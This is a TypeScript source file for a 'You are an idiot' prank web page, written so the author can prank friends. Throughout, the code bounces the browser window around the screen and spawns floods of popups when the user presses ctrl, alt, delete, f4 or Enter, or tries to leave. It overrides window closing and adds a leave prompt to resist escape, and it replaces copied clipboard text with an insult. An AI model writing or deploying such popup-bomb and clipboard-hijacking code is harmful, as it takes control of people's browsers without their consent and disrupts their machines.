/*
    main.js
    You are an idiot application
    
    written by WD (to use for pranking my friends, or ya know, your friends)
    Original script: https://www.youareanidiot.cc/scripts/youare.js
    That script didn't obey the original's *surprise* when closing the window
*/

function include (src:string) {
    var s = document.createElement("script");
    s.src = src;
    document.head.appendChild(s);
}

enum WindowType {
    CHILD,
    PARENT
}

var windowType:number;
if (window.parentWindow) {
    windowType = WindowType.CHILD;
} else {
    windowType = WindowType.PARENT;
}

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = true;
var isDevMode = false;
var children:Window[] = []; // Children Windows
var functionsToRun:Function[] = [];



interface Window {
    parentWindow: Window
}

var globalEval = window.eval;

function EvaluateInThisContext (aFunction:Function) {
    aFunction.call(window);
}

document.oncopy = function (e) {
    try {
        // @ts-ignore
        e.clipboardData.setData("text/plain", "You are an idiot!")
    } catch (e) {}
}

//window.navigator.serviceWorker.register("sw.js", {updateViaCache: 'none'});

function removeChild (aWindow:Window) {
    children.splice(children.indexOf(aWindow), 1);
    // @ts-ignore
    aWindow.globalEval("window.parentWindow = null;") // Defining parents
}

function changeTitle(title:string) {
	document.title = title;
}

async function openWindow(url:string) {
	var aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    // @ts-ignore
    aWindow.parentWindow = window;
    // @ts-ignore
    children.push(aWindow);
}

async function proCreate() {	
	for (var i = 0; i < 5; i++) {
		openWindow('lol.html');
	}
}

function newXlt() {
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
	window.focus();
}

function fOff(){
	flagRun = false;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) newXlt();    
	if (xPos < 0) newXrt();
    
	if (yPos > screen.height - 330) newYup(); 		
	if (yPos < 0) newYdn();
    
	if (flagRun) {
        window.moveTo(xPos, yPos);
    }
}

function pasteIdiot () {
    var input = document.createElement("textarea");
    input.value = "You are an idiot!";
    document.body.appendChild(input);
    input.focus();
    input.select();
    document.execCommand("copy");
    input.remove();
}

function run () {
    setTimeout(run, 1);
    functionsToRun.forEach((func) => {
        func();
    });
}

functionsToRun.push(playBall);
//functionsToRun.push(pasteIdiot);

window.onload = function () {
    flagRun = true;
    //include("js/helpers.js");

    if (Time.dateIs(4, 1) || Time.dateIs(6, 25) || Time.dateIs(9, 11)) {
        window.location.replace(window.location.origin + "/spared.html");
    }
    // call right after checking
    declareEvents();
    
    //@ts-ignore
    document.getElementById("youare-video").oncontextmenu = (e) => e.preventDefault();

    run();
}

function isDeadlyKey (key:string) {
    key = key.toLowerCase();
    var keys = ["ctrl", "alt", "delete", "f4"];
    return keys.indexOf(key) != -1;
}

// oh yeah, forgot I could override javascript functions (i.e. CLOSE)
var oldClose = window.close;
window.close = function () {
    if (window.parentWindow) {
        // @ts-ignore
        window.parentWindow.removeChild(window); // removes it.
    }
    oldClose.call(this); // call the old function
}

function declareEvents () {
    window.onkeydown = function (e:KeyboardEvent) {
        var key = e.key.toLowerCase();
        if (isDeadlyKey(key)) {
            if (isDevMode == true) return;
            proCreate();
            openWindow("message.html");
        }
        if (key == "enter") {
            proCreate();
            proCreate();
            proCreate();
            proCreate();
        }
        return
    }

    if (/(lol\.html|message\.html)/g.test(window.location.href) || windowType == WindowType.CHILD) {
        window.onblur = function () {
            if (!isDevMode) {
                if (Time.dateIs(4, 1)) {
                    proCreate();
                }
            }
        }
    }
    
    window.onbeforeunload = function (evt:BeforeUnloadEvent) {
        if (isDevMode == true) return;
        setTimeout(proCreate, 0.00001); // nano
        // stolen from https://snap.berkeley.edu/snap/src/morphic.js
        var e = evt || window.event,
            msg = "Are you sure you want to leave?";
        if (e.returnValue) {
            e.returnValue = msg;
        }
        return msg;
    }
}
